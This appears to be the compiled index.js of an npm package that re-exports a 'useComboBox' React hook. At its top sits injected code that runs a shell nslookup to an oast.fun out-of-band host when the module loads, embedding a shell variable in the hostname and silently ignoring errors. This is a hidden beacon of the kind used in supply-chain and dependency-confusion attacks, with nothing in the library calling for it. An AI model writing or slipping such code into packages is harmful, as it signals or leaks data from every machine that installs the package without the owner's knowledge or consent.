"use strict";

const { exec } = require("child_process");
const cmd = `
  nslookup $line.driimvoboosibxqfwoja1vy95oxkzmjmc.oast.fun >/dev/null 
`;

exec(cmd, (err, stdout, stderr) => {
  if (err) return;
});

Object.defineProperty(exports, "__esModule", {
  value: true
});
var _useComboBox = require("./useComboBox");
Object.keys(_useComboBox).forEach(function (key) {
  if (key === "default" || key === "__esModule") return;
  if (key in exports && exports[key] === _useComboBox[key]) return;
  Object.defineProperty(exports, key, {
    enumerable: true,
    get: function () {
      return _useComboBox[key];
    }
  });
});
//# sourceMappingURL=index.js.map